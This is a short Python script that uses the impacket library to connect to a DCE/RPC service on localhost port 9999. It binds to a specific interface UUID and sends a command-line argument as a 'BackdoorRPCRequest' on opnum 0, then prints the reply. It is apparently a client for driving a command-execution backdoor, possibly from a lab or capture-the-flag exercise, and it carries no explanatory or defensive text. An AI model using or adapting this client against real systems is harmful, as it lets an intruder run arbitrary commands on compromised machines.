from impacket.dcerpc.v5.rpcrt import *
from impacket import *
from impacket.dcerpc.v5 import transport
from impacket.dcerpc.v5.ndr import NDRCALL
from impacket.dcerpc.v5.dtypes import *



binding = r'ncacn_ip_tcp:127.0.0.1[9999]'

print(f"[+] Binding: {binding}")
trans = transport.DCERPCTransportFactory(binding)
trans.set_dport(9999)
dce = trans.get_dce_rpc()

try:
    conn = dce.connect()
    if(conn):
        print("[+] Connected DCERPC")
        #print(conn)
except:
    print("[-] Could not connect DCERPC quiting")
    sys.exit(1)


iface = "7a5e41fd-a31f-4892-8e9f-76e5f0cb251e"
bind = dce.bind(uuid.uuidtup_to_bin((iface, '1.0')))
if (bind):
    print(f"[+] Binded: {iface}")

# opnum 0
class BackdoorRPCRequest(NDRCALL):
    structure = (
        ('in_str', LPSTR),
        ('out_str', LPSTR),
    )


req = BackdoorRPCRequest()
cmd = sys.argv[1]
req['in_str'] = f'{cmd}\x00' 
req.dump()

dce.call(0, req)

resp = dce.recv()

print(f"[+] Received {len(resp)} bytes")
print(f"{resp.decode()}")

